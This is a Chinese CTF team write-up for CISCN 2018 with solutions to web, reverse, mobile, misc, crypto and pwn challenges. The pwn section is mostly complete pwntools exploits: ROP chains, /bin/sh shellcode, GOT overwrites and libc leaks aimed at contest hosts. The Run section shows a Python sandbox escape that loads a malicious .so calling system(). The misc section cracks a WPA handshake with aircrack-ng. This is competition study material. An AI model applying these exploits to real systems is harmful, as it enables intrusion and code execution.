# BUPT-Xopowo-ciscn2018

# WEB

## EASYWEB
一开始以为是修改jwt，尝试了很久，最后发现是空密码登入

## RE

将flag用"_"分为三部分，分别验证
- 第一部分是直接MD5，然后对得到的HexString中的字母做变换, 反推得到MD5串```5DF7F1701B778D03D57456AFEA567922```, 为md5("tofu")
```
if ( (unsigned __int8)(v2 - 'A') <= 5u )
    v13[i] = (signed int)i % 10 + v2;
```

- 第二部分和第一部分类似，同样是MD5，并对结果HexStr做变换，但是多了异步异或，反推得到MD5```57E6E9B3CE8603FDE63FB396E2A57F83```, 为md5("gana")
```
v1 = 0LL;
do
{
    *((_BYTE *)&v12 + v1) ^= byte_603740[v1];
    ++v1;
}
while ( v1 != 16 );
```

- 第三部分是MD5，程序中内置了一个文件，并通过两个不同的1-byte密钥对文件的奇偶位加密。首先猜测大量的0xF7 0x51对应的0x00 0x00，可以解出可见的字符串，但是有少许的错误，经过调整得到密钥0xF6 0x50
- 解密后的文件为JPG格式，图片中可以找到字符串，即是第三部分的flag
- 拼接后得到flag：CISCN{tofu_gana_NjiTT&Xcv=zEh95}


## 2ex

MIPS架构的base64

使用了RetDec的反编译服务，得到源码
得到源码做少量修改，使用VS重新编译优化，再利用F5反编译，得到更加易懂的程序。
可以看出是更换alphabet的base64
新表为```@,.1fgvw#`/2ehux$~\"3dity%_;4cjsz^+{5bkrA&=}6alqB*-[70mpC()]89noD```

```
import string
import base64

STANDARD_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
CUSTOM_ALPHABET = '@,.1fgvw#`/2ehux$~\"3dity%_;4cjsz^+{5bkrA&=}6alqB*-[70mpC()]89noD'
ENCODE_TRANS = string.maketrans(STANDARD_ALPHABET, CUSTOM_ALPHABET)
DECODE_TRANS = string.maketrans(CUSTOM_ALPHABET, STANDARD_ALPHABET)

def encode(input):
  return base64.b64encode(input).translate(ENCODE_TRANS)

def decode(input):
  return base64.b64decode(input.translate(DECODE_TRANS))
```
解密out文件即可得到flag:```flag{change53233}```

## NoSet

俄罗斯套娃逆向题：Win32 -> 内存加载 -> 加载驱动 -> 驱动内存加载
- 第一层直接在NtReadFile下断然后回溯即可到达动态加载的区段。IDA中Take Memory Snapshot保存区段分析可以得知是在动态加载一个dll
- 第二层 Dump之后分析发现释放了一个驱动文件，并在加载后使用Pipe通信
- 第三层 Dump驱动sys文件之后，分析得知其内存加载了第二层传入的数据
- 第四层 解密传入数据得到一个dll，分析得知为换表的base64，新表为```vwxrstuopq34567ABCDEFGHIJyz012PQRSTKLMNOZabcdUVWXYefghijklmn89+/```, 数据为```6NFiyrMTyKsj6r2TyrviyKCNJKpY7r6S6EGT5NCMJip=```

# Mobile

## Illusion

替换了JNI的注册结构体，内部算法初步分析得知为按字节加密，且字节之间无关联。
似乎使用了自定义的calling convention，在0x10C0处设置
```
int __usercall Decrypt@<R1>(int@<R0>, int@<R1>)
```
直接导出源代码然后逐位爆破并排除不可见字符即可得到flag
```
0 - 67 C
1 - 73 I
2 - 83 S
3 - 67 C
4 - 78 N
5 - 30 123 {
6 - 71 G
7 - 74 J
8 - 54 6
9 - 53 5
10 - 48 0
11 - 102 f 
12 - 32 125 }

CISCN{GJ650f}
```

# Misc

## 验证码

签到

## 寻找入侵者

打开压缩包，里面有 `hanshake.cap attack.pcapng` 两个流量包
题目里面叫在 attach 包中找密码，看到名字叫 `hanshake`，直接丢到 `aircrack-ng` 里
发现握手包

记下来 `ESSID = Honey`

“握手包就是网卡地址”，`wireshark` 打开 `attack` 包，打开已解析的mac地址，看到有455条

写成字典，同样用 `aircrack-ng` 爆破握手包密码，现在就用到了刚才记下的 `ESSID`

```
aircrack-ng ./hanshake.cap -e Honey -w mac_addr.txt
```
成功找到密码

```
88:25:93:c1:c8:eb
```
用 `airdecap` 解开数据包

```
airdecap-ng -p 88:25:93:c1:c8:eb -e Honey ./hanshake.cap
```
打开得到的 `hanshake-dec.cap`，用 http 关键字过滤一下

看到有 get 到一个 `key.rar`，直接点开地址下载
解压，用16进制编辑器打开，
文件拖到底，看到可疑字符串
`CISCN{sXsMjHoh5IBzAab527F1JkDIORpAxK8K4}`

## Run

Python沙箱绕过

在`().__class__.__bases__[0].__subclasses__()`中发现有可用的类

```
<type 'file'>
<class 'ctypes.CDLL'>
<class 'ctypes.LibraryLoader'>
```

读文件
```
print ().__class__.__bases__[0].__subclasses__()[40]("/home/ctf/sandbox.py").read()
```

写文件
```
().__class__.__bases__[0].__subclasses__()[40]("/tmp/aaa",'wb').write('123')
```

构造一个so库，列一下`/home/ctf/`下的文件

```
#include <stdio.h>  
void my_init(void) __attribute__((constructor)); 
void my_init(void)  
{  
    system("ls -la /home/ctf/ > /tmp/ls_home_ctf");
}  

```

将编译好的so直接二进制写入`/tmp/bk.so`

使用ctypes加载so
```
().__class__.__bases__[0].__subclasses__()[86](().__class__.__bases__[0].__subclasses__()[85]).LoadLibrary('/tmp/bk.so')
```

```
>>>print ().__class__.__bases__[0].__subclasses__()[40]("/tmp/l\x73_home_ctf").read()
total 40
drwxr-x--- 3 root ctf  4096 Apr 26 04:43 .
drwxr-xr-x 3 root root 4096 Apr 26 04:43 ..
-rwxr-x--- 1 root ctf   220 Aug 31  2015 .bash_logout
-rwxr-x--- 1 root ctf  3797 Apr 26 04:43 .bashrc
-rwxr-x--- 1 root ctf   655 May 16  2017 .profile
-rwxr----- 1 root ctf    40 Apr 28 12:37 5c72a1d444cf3121a5d25f2db4147ebb
drwxr-xr-x 2 root root 4096 Apr 26 04:43 bin
-rwxr-x--- 1 root ctf   255 Apr 10 15:36 cpython.py
-rwxr-x--- 1 root ctf   536 Apr 10 15:36 cpython.pyc
-rwxr-x--- 1 root ctf  2982 Apr 10 15:36 sandbox.py
```

```
>>>print ().__class__.__bases__[0].__subclasses__()[40]("/home/ctf/5c72a1d444cf3121a5d25f2db4147ebb").read()
ciscn{57f50357cc5f2fc48f284a8472f79dc3}
```

## Picture

`task_ctf_09_yH9eRhd.jpg` 文件末尾处有一个 zlib ，导出并解压，得到一串 base64 。解码之后获得一个文件头为KP的文件，最后有以下字样。

```
[Python 2.7]
>>> ???

Traceback (most recent call last):
  File "<pyshell#0>", line 1, in <module>
    ???
ZeroDivisionError: ????????????????????????? <- password ;)
>>> 
```

调整文件头为PK，使用python尝试 1/0 获得密码 `integer division or modulo by zero` 解压后得到 UUencode 的一个文件：

```
begin 644 key.txt
G0TE30TY[.#,T1D4W,CDQ140X.#="1D4Y04,W,S,T,$-$045#131]
`
end
```

解码后得到flag `CISCN{834FE7291ED887BFE9AC73340CDAECE4}`

## memory-forensic

MacOS内存取证
使用sudo kextload agent.kext可以加载kext，
通过panic log可以查看stacktrace
但是并不能知道是怎么算的flag
考虑可以在panic的时候停下来
```
nvram boot-args="debug=0x546 kcsuffix=development pmuflags=1 kext-dev-mode=1 slide=0 kdp_match_name=en0 -v"
```
然后可以在panic的时候等待keystroke
此时备份vmem，搜索CISCN{即可找到flag

# Crypto 

## flag_in_your_hand

script.min.js 格式化后找到：

```
var a = [101, 103, 100, 116, 118, 104, 102, 120, 117, 108, 119, 124];
for (i = 0; i < s.length; i++) {
    if (a[i] - s.charCodeAt(i) != 3)
        return ic = false;
}
```

将每个数字减 3 获得 key `bdaqsecurity`，提交后得 flag `l2JtNV3DcBbf5Keyv7y4KQ`。

## oldstreamgame

又是流密码，正确做法按是mask中的8位，分别爆破。但估计了一下0xfffff的时间要20s，只需要0xfff*20s/40核机器 不到一小时可以爆破。遂修改加密部分，提高了计算效率。多进程爆破即可。
```
#from flag import flag
#assert flag.startswith("flag{")
#assert flag.endswith("}")
#assert len(flag)==47
import time
import os
import threading
from multiprocessing import Pool as ThreadPool

POOLSIZE = 35

with open("key","rb") as f:
    tmpList = f.read()

def lfsr(R):
    output = (R << 1) & 0xffffffff
    
    a = (R >> 2) & 1
    b = (R >> 4) & 1
    c = (R >> 7) & 1
    d = (R >> 11) & 1
    e = (R >> 19) & 1
    f = (R >> 26) & 1
    g = (R >> 29) & 1
    h = (R >> 31) & 1
    
    lastbit = a^b^c^d^e^f^g^h 
    output^=lastbit
    return (output,lastbit)

def chunkIt(seq, num):
    avg = len(seq) / float(num)
    out = []
    last = 0.0

    while last < len(seq):
        out.append(seq[int(last):int(last + avg)])
        last += avg

    return out

def process(p_range):
    for K in p_range:
        R = K
        for op in range(82):
            tmp=0
            for j in range(8):
                (R,out)=lfsr(R)
                tmp=(tmp << 1)^out
            #print (type(tmp), type(tmpList[0]))
            if ord(tmpList[op]) != tmp:
                break
            
            if op > 80:
                print(K)
                

def main():
    #len(R) = 41
    #R=int(flag[5:-1],2)

    p_list = chunkIt(range(0xffffffff), POOLSIZE)

    pool = ThreadPool(POOLSIZE)
    results = pool.map(process, p_list)


if __name__ == "__main__":
    start = time.clock()
    main()
    end = time.clock()
    print(end - start)
```

# PWN

## house of grey

```
#coding:utf-8
from pwn import *
from ctypes import *
debug = 0
elf = ELF('./task_house_P4U73bf')
#ciscn{57de0cd00899090b7193b2a99508e6db}
if debug:
	p = process('./task_house_P4U73bf')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	context.log_level = 'debug'
else:
	p = remote('117.78.43.123', 32619)
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	#off = 0x001b0000
	context.log_level = 'debug'

p.recvuntil('Y/n')
p.sendline('y')
p.recvuntil('Exit')
p.sendline('1')
p.recvuntil('finding?')

p.sendline('/proc/self/maps')
p.recvuntil('Exit')
p.sendline('3')
p.recvuntil('get?')
p.sendline('10000')
p.recvuntil('something:\n')
pie = int('0x'+p.recvuntil('-')[:-1],16)
print '[+] pie:',hex(pie)
while 1:
	a = p.recvline()
	if 'heap' in a:
		a = p.recvline()
		stack_start = int(a.split('-')[0],16)
		stack_end = int((a.split('-')[1]).split(' ')[0],16)
		print '[+] stack_start:',hex(stack_start)
		print '[+] stack_end:',hex(stack_end)
		break
while 1:
	a = p.recvline()
	if 'libc' in a:
		libc.address = int(a.split('-')[0],16)
		print '[+] system:',hex(libc.symbols['system'])
		break

#gdb.attach(p)
#offset =  0x7f9ae9658000 - 0x7f9ad9e79388
#print '[*] canary : ',hex( stack_end - offset)
canary = 0
p.recvuntil('Exit')
p.sendline('1')
p.recvuntil('finding?')
p.sendline('/proc/self/mem')
p.recvuntil('Exit')
p.sendline('2')
p.recvuntil('you?')
stack_guess = 0xf800000
p.sendline(str(stack_end - stack_guess - 24*100000))
print '[+] offset from ',hex( stack_guess + 24*100000),'to',hex(stack_guess)
print '[+] from ',hex(stack_end - stack_guess - 24*100000),'to',hex(stack_end - stack_guess)
for i in range(0,24):
	p.recvuntil('Exit')
	p.sendline('3')
	p.recvuntil('get?')
	p.sendline('100000')
	p.recvuntil('something:\n')
	tmp = p.recvuntil('1.Find ')[:-7]
	#print '[-] len:',len(tmp)
	#for a in tmp:
	#	if a != '\0':
	#		print a,
	if '/mem' in tmp:
		print '[+++] find'
		print tmp.split('/proc/self/mem')[0]
		canary = u64(tmp.split('/proc/self/mem')[0][-0x48:-0x40])

		break

stack_address = stack_end - stack_guess - 24*100000 + i *100000 + len(tmp.split('/proc/self/mem')[0])

if canary==0:
	print '[-] fail'
	exit(0)
print '[+] canary :',hex(canary)
print '[+] stack :',hex(stack_address)
p.recvuntil('Exit')
p.sendline('1')
p.recvuntil('finding?')
p.sendline('/proc/self/mem'+'\x00'*(0x18-14)+p64(stack_address-56))
p.recvuntil('Exit')
#gdb.attach(p)
#raw_input()
p.sendline('4')
p.recvuntil('content')
#open('flag') 
rop =p64(pie+0x0000000000001823)+p64(stack_address-56+0x100)+p64(pie+0x0000000000001821)+p64(0)+p64(0)+p64(pie+elf.symbols['open'])+p64(pie+0x0000000000001823)+p64(6)+p64(pie+0x0000000000001821)+p64(stack_address-56+0x100)+p64(stack_address-56+0x100)+p64(pie+elf.symbols['read'])+p64(pie+0x0000000000001823)+p64(stack_address-56+0x100)+p64(pie+elf.symbols['puts'])
rop +='a'*(0x100-len(rop))
rop += '/home/ctf/flag\0'
#p64(pie+0x0000000000001823) + p64(elf.got['puts'])  +p64(elf.symbols['puts'])+p64(pie+0x0000000000001823) + p64(elf.got['read']) +p64(elf.symbols['puts'])+p64(pie+0x0000000000001823) + p64(elf.got['write']) +p64(elf.symbols['puts'])
# p64(pie+0x0000000000001823)+p64(stack_address-56+0x40)+
#p64(pie+0x0000000000001823)+p64(stack_address-56+0x40)+
#rop= p64(pie+0x0000000000001823)+ p64(next(libc.search('/bin/sh')))+p64(elf.symbols['puts'])
p.sendline(rop)


p.interactive()
'''
hex(-0x7fb165afd580 +0x7fb174d53000)  0xf255a80
hex(-0x7f810afe4db0 + 0x7f811af62000) 0xff7d250
hex(-0x7fe3844beeb0 + 0x7fe394428000) 0xff69150
hex(-0x7f73844633a0 + 0x7f73940a9000) 0xfc45c60
0x0000000000001823 : pop rdi ; ret

0x0000000000001821 : pop rsi ; pop r15 ; ret


    00000000  23 28 99 7f  32 56 00 00  20 2f 20 00  00 00 00 00  │#(··│2V··│ / ·│····│
    00000010  00 0b 00 00  00 00 00 00  23 28 99 7f  32 56 00 00  │····│····│#(··│2V··│
    00000020  70 2f 20 00  00 00 00 00  00 0b 00 00  00 00 00 00  │p/ ·│····│····│····│
    00000030  23 28 99 7f  32 56 00 00  30 2f 20 00  00 00 00 00  │#(··│2V··│0/ ·│····│
    00000040  00 0b 00 00  00 00 00 00  0a 
[DEBUG] Sent 0x49 bytes:
    00000000  23 28 99 7f  32 56 00 00  20 2f 20 00  00 00 00 00  │#(··│2V··│ / ·│····│
    00000010  00 0b 00 00  00 00 00 00  23 28 99 7f  32 56 00 00  │····│····│#(··│2V··│
    00000020  70 2f 20 00  00 00 00 00  00 0b 00 00  00 00 00 00  │p/ ·│····│····│····│
    00000030  23 28 99 7f  32 56 00 00  30 2f 20 00  00 00 00 00  │#(··│2V··│0/ ·│····│
    00000040  00 0b 00 00  00 00 00 00  0a                        │····│····│·│
    00000049
[*] Switching to interactive mode
: 
[DEBUG] Received 0x40 bytes:
    '/home/ctf/run.sh: line 2:    84 Segmentation fault      ./house\n'
/home/ctf/run.sh: line 2:    84 Segmentation fault      ./house
[*] Got EOF while reading in interactive
$ 

'''
```

## note

```
from pwn import *
from ctypes import *
debug = 0
elf = ELF('./task_note_service2_OG37AWm')
context.update(arch = 'amd64')
#ciscn{93707fa0f2eca125f3998d0c6fb1a932}
if debug:
	p = process('./task_note_service2_OG37AWm')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	context.log_level = 'debug'
	gdb.attach(p)
else:
	p = remote('117.78.43.123', 31128)
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	#off = 0x001b0000
	#context.log_level = 'debug'
def add(index,content):
	p.recvuntil('your choice>>')
	p.sendline('1')
	p.recvuntil('index')
	p.sendline(str(index))
	p.recvuntil('size')
	p.sendline(str(8))	
	p.recvuntil('content')
	p.send(content)

add(0,'/bin/sh')
add((elf.got['free']-0x2020A0)/8,asm('xor rsi,rsi')+'\x90\x90\xe9\x16')
add(1,asm('push 0x3b\n pop rax')+'\x90\x90\xe9\x16')
#add(1,asm('xor rsi,rsi')+'\x90\x90\xe9\x16')
add(2,asm('xor rdx,rdx')+'\x90\x90\xe9\x16')
add(3,asm('syscall')+'\x90'*5)

p.recvuntil('choice')
p.sendline('4')
p.recvuntil('index')
p.sendline('0')
p.interactive()
```

## supermarket

```
from pwn import *
import time
context(arch = 'i386', os = 'linux', endian = 'little')
context.log_level = 'debug'

REMOTE = 1
IP = '117.78.43.123'
PORT = 30222
ATTACH = 1

def add(p, n, pr, s, d):
	p.recvuntil('>> ')
	p.sendline('1')
	p.recvuntil(':')
	p.send(n)
	p.recvuntil(':')
	p.sendline(str(pr))
	p.recvuntil(':')
	p.sendline(str(s))
	p.recvuntil(':')
	p.send(d)

def delete(p, n):
	p.recvuntil('>> ')
	p.sendline('2')
	p.recvuntil(':')
	p.send(n)

def list(p):
	p.recvuntil('>> ')
	p.sendline('3')


def StackOverFlow(p, rop):
	add(p, 'w1tcher'.ljust(0xf, '0'), 666, 0x100, p32(0x70000000) * 63 + '\n')
	delete(p, 'w1tcher'.ljust(0xf, '0') + '\n')
	add(p, 'w1tcher'.ljust(0xf, chr(ord('1') + 0)), 666, 0x14, 'X' * 0x10 + '\n')
	for i in range(1, 5):
		add(p, 'w1tcher'.ljust(0xf, chr(ord('1') + i)), 1000, 0x14, 'X' * 0x10 + '\n')

	add(p, 'w1tcher'.ljust(0xf, '0'), 666, 0x100, p32(0x70000000) * 63 + '\n')
	delete(p, 'w1tcher'.ljust(0xf, '0') + '\n')
	add(p, 'w1tcher'.ljust(0xf, chr(ord('A') + 5)), 666, 0x14, 'X' * 0x10 + '\n')
	for i in range(1, 5):
		add(p, 'w1tcher'.ljust(0xf, chr(ord('A') + i)), 1000, 0x14, 'X' * 0x10 + '\n')

	add(p, 'w1tcher'.ljust(0xf, '0'), 666, 0x100, p32(0x70000000) * 63 + '\n')
	delete(p, 'w1tcher'.ljust(0xf, '0') + '\n')
	add(p, 'w1tcher'.ljust(0xf, chr(ord('a') + 10)), 666, 0x14, 'X' * 0x10 + '\n')
	for i in range(1, 3):
		add(p, 'w1tcher'.ljust(0xf, chr(ord('a') + i)), 1000, 0x14, 'X' * 0x10 + '\n')

	add(p, '2' + '\n', 1000, 0x14, '0' * 0x10 + '\n')
	add(p, '1' + '\n', 1000, 0x14, '0' * (0x10 - 0x7) + '\n')
	add(p, 'hacked'.ljust(12, '0') + '\n', 666, 0x14, rop + '\n')
	list(p)

if REMOTE == 0:
	p = process('./supermarket')
	if ATTACH == 1:
		gdb.attach(p)
	offset_system = 0x3ada0
	offset_str_bin_sh = 0x15b9ab
	offset_puts = 0x5fca0
else:
	p = remote(IP, PORT)
	offset_system = 0x0003a940
	offset_str_bin_sh = 0x15902b
	offset_puts = 0x0005f140

puts_plt = 0x8048570
puts_got = 0x804B02C
main_addr = 0x08049039
leave_ret_addr = 0x804882C
pop_ret = 0x80484d9
read_line = 0x8048812
stack_povit = 0x804b000 + 0xa10
hack_addr = 0x8048839

StackOverFlow(p,p32(stack_povit) + p32(hack_addr))
time.sleep(2)
p.recv(1024)
shellcode = p32(stack_povit)
shellcode += p32(puts_plt) + p32(pop_ret) + p32(puts_got)
shellcode += p32(read_line) + p32(leave_ret_addr) + p32(stack_povit) + p32(0x100)
p.send('\x00' * 0x28 + shellcode + '\n')

libc_addr = u32(p.recvn(4)) - offset_puts
log.info('libc address is : ' + hex(libc_addr))

shellcode = p32(stack_povit)
shellcode += p32(libc_addr + offset_system) + p32(main_addr) + p32(libc_addr + offset_str_bin_sh)
p.send('\x00' * 0x10 + shellcode + '\n')

p.interactive()

```

## MrP

```
from pwn import *
import hashlib
import math
context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'

def POW(p, data, key):
	asc = '_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+'
	for i in asc:
		for j in asc:
			for k in asc:
				if hashlib.md5(data + i + j + k).hexdigest() == key:
					# print data + i + j + k
					p.sendline(i + j + k)
					return

# POW(0, '5b592455de0fb6e1a32bfee00f82c564', 'xORzbbrNti6lW')

def PLOVE(p):
	# p.recvuntil('TRUE Love\n')
	p.sendline('1')
	p.recvuntil('c:')
	return p.recvuntil('\n')[0 : -1]

def QLOVE(p):
	# p.recvuntil('TRUE Love\n')
	p.sendline('2')
	p.recvuntil('c:')
	return p.recvuntil('\n')[0 : -1]

def PLOVE3(p):
	# p.recvuntil('TRUE Love\n')
	p.sendline('1')
	p.sendline('3')
	p.recvuntil('c:')
	return p.recvuntil('\n')[0 : -1]

def QLOVE3(p):
	# p.recvuntil('TRUE Love\n')
	p.sendline('2')
	p.sendline('3')
	p.recvuntil('c:')
	return p.recvuntil('\n')[0 : -1]

def gcd(a,b):
		while a!=0:
			a,b = b%a,a
		return b

def findModReverse(a,m):
		if gcd(a,m)!=1:
			return None
		u1,u2,u3 = 1,0,a
		v1,v2,v3 = 0,1,m
		while v3!=0:
			q = u3//v3
			v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3
		return u1%m

def Test(p, p2, flag):
	step = 0x10000000000000000000
	t = p;
	# print p, p2, flag
	while 1:
		# print t, t * t, p2, flag
		t = t + flag * step
		if flag == -1:
			if t * t <= p2:
				break
		else:
			if t * t >= p2:
				t = t - flag * step
				break
	step /= 2
	while step != 0:
		# print step, t
		if (t + step) * (t + step) == p2:
			return t + step
		if (t + step) * (t + step) < p2:
			t = t + step
		step /= 2
	return t



def GetP(p10001, p10003, mod):
	print hex(p10001), hex(p10003), hex(mod)
	print findModReverse(p10001, mod)
	p2 = (findModReverse(p10001, mod) * p10003) % mod
	print hex(p2)
	p = int(math.sqrt(p2))
	print hex(p)
	if p * p == p2:
		return p
	if p * p > p2:
		p = Test(p, p2, -1)
	else:
		p = Test(p, p2, 1)

	return p

def GameStart(ip, port, debug):
	if debug == 1:
		p = process('./mrp')
		gdb.attach(p)
	else:
		p = remote(ip, port)
	p.recvuntil('heart: ')
	key = p.recvuntil(' ')[0 : -1]
	key = key.decode('hex')
	ckey = ''
	for i in key:
		ckey += chr(ord(i) ^ 0x77)
	ckey = ckey.encode('hex')
	data = p.recvn(13)
	POW(p, data, ckey)
	p.recvuntil('TRUE Love\n')

	modP = 0x60339c688f579dd4f661bb3430e18672349f1e8843b062e11abb15d34bdaca8c2c01c18983216af16cb323c17058ed36f233375fe89291585b82e32034ab625896f250e35e9dda1a78d6f3014b4403f4690c1bfae9d984c1a91d9ec2a499ff36e62d2872b677582e1de8ff3f31cdbba408bcddc4f024ad327a5f590f12848d955bb3fef29dbcd49b6918d6880243602cbf9a906df384716a66c9ea144db2d4a5733c7de44db7b2b6a77fd17f34e7e837793114b6f7e7d7b4529523d0eb04300f42f84720dd651e9a653d642dedef29dd388efa64f42a2ae50d7985497f4774c56cdbc2f5a3ea4734e683279328486fe4427d72f2f68465fb5a8a4ac0478b49fb
	modQ = 0x6b630677d9178549d6de070923e9d66869a8007b08071fdc4ea3755a97f9f5b03806bb743d570a0e573861cf3636a8c1d76e171bf742a28800b57061047be6a672654df76bd92f488123a7f8e0922ac1d4c62465db3311e4bec159b8827fffe3fb59486a194001fbd68824767cadc26189d2e29b61c8125f5c52dc153f20a86bd086fe13da4853bca02ab60893c2d0a960abce24b96d79afa1289d0cbdc4846dcfc9ea213be13c9e76357cc86714e0220ddaa8462e91dcdac14642cd3648c42b53c7ec0ad396494ed5bd461b2efdb2027a80e582d0c70a5eac18ac4b61a6844c26bb7ba606a9b8991902a002a964fd8b3a9c5ff29a3ab387ab27d8b4acd0fd63

	Qp10001 = int(QLOVE(p), 16)
	print hex(Qp10001)
	Qp10003 = int(QLOVE3(p), 16)
	print hex(Qp10003)
	Qp = GetP(Qp10001, Qp10003, modQ)
	print hex(Qp)

	Pp10001 = int(PLOVE(p), 16)
	print hex(Pp10001)
	Pp10003 = int(PLOVE3(p), 16)
	print hex(Pp10003)
	Pp = GetP(Pp10001, Pp10003, modP)
	print hex(Pp)


	p.sendline('4')
	p.sendline(hex(Pp)[2 :])
	p.sendline(hex(Qp)[2 :])

	# p2 = 0x60cb030cd97bfa686380ddf3407061c814ff16c57ec3f9287e26703e89a85f10
	# print hex(p2)
	# p = int(math.sqrt(p2))
	# print hex(p)
	# if p * p == p2:
	# 	return p
	# if p * p > p2:
	# 	p = Test(p, p2, -1)
	# else:
	# 	p = Test(p, p2, 1)

	# print p




	p.interactive()

if __name__ == '__main__':
	GameStart('117.78.43.127', 30542, 1)
```

## magic

```
from pwn import *
context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'

def CreateWizard(p, name):
	p.recvuntil('choice>> ')
	p.sendline('1')
	p.recvuntil('name:')
	p.send(name)

def WizardSpell(p, index, data):
	p.recvuntil('choice>> ')
	p.sendline('2')
	p.recvuntil('spell:')
	p.sendline(str(index))
	p.recvuntil('name:')
	p.send(data)

def FinalChance(p, index):
	p.recvuntil('choice>> ')
	p.sendline('3')
	p.recvuntil('chance:')
	p.sendline(str(index))

def GameStart(ip, port, debug):
	if debug == 1:
		p = process('./magic')
		gdb.attach(p)
		puts_offest = 0x6f690
		system_offest = 0x45390
	else:
		p = remote(ip, port)
		puts_offest = 0x000000000006f690
		system_offest = 0x0000000000045390
	CreateWizard(p, 'w1tcher')
	WizardSpell(p, 0, 'hack by w1tcher')

	# WizardSpell(p, -2, '\x00')
	for i in range(8):
		WizardSpell(p, -2, '\x00')
	WizardSpell(p, -2, '\x00' * 13)
	for i in range(3):
		WizardSpell(p, -2, '\x00')
	WizardSpell(p, -2, '\x00' * 9)
	WizardSpell(p, -2, '\x00')

	puts_got = 0x602020
	fwrite_got = 0x602090
	log_addr = 0x6020E0

	WizardSpell(p, 0, '\x00' * 3 + p64(0x231) + p64(0xfbad24a8))
	WizardSpell(p, 0, p64(puts_got) + p64(puts_got + 0x100))

	libc_addr = u64(p.recvn(8)) - puts_offest
	log.info('libc addr is : ' + hex(libc_addr))

	WizardSpell(p, -2, p64(puts_got) + p64(0))
	WizardSpell(p, 0, '\x00' * 2 + p64(0x231) + p64(0xfbad24a8))
	WizardSpell(p, 0, p64(log_addr) + p64(puts_got + 0x100) + p64(puts_got))

	heap_addr = u64(p.recvn(8)) - 0x10
	log.info('heap addr is : ' + hex(heap_addr))
	WizardSpell(p, 0, p64(heap_addr + 0x58) + p64(0) + p64(heap_addr + 0x58))
	WizardSpell(p, 0, p64(0x602122) + p64(0x602123 + 0xa00))
	# for i in range(3):
	WizardSpell(p, -2, '\x00')
	WizardSpell(p, -2, '\x40')
	WizardSpell(p, -2, '\x00')
	# WizardSpell(p, -2, '\x00')
	WizardSpell(p, 0, '\x00' * 2 + p64(libc_addr + system_offest)[0 : 6])
	WizardSpell(p, 0, '/bin/sh')
	# WizardSpell(p, 0, p64(fwrite_got) + p64(fwrite_got) + p64(fwrite_got + 0x100))
	# WizardSpell(p, 0, p64(libc_addr + system_offest))
	# WizardSpell(p, 0, '/bin/sh')
	# WizardSpell(p, -2, '\x00' * 3)
	# WizardSpell(p, -2, '\x00' * 2)

	p.interactive()

if __name__ == '__main__':
	GameStart('117.78.43.222', 32315, 1)
```
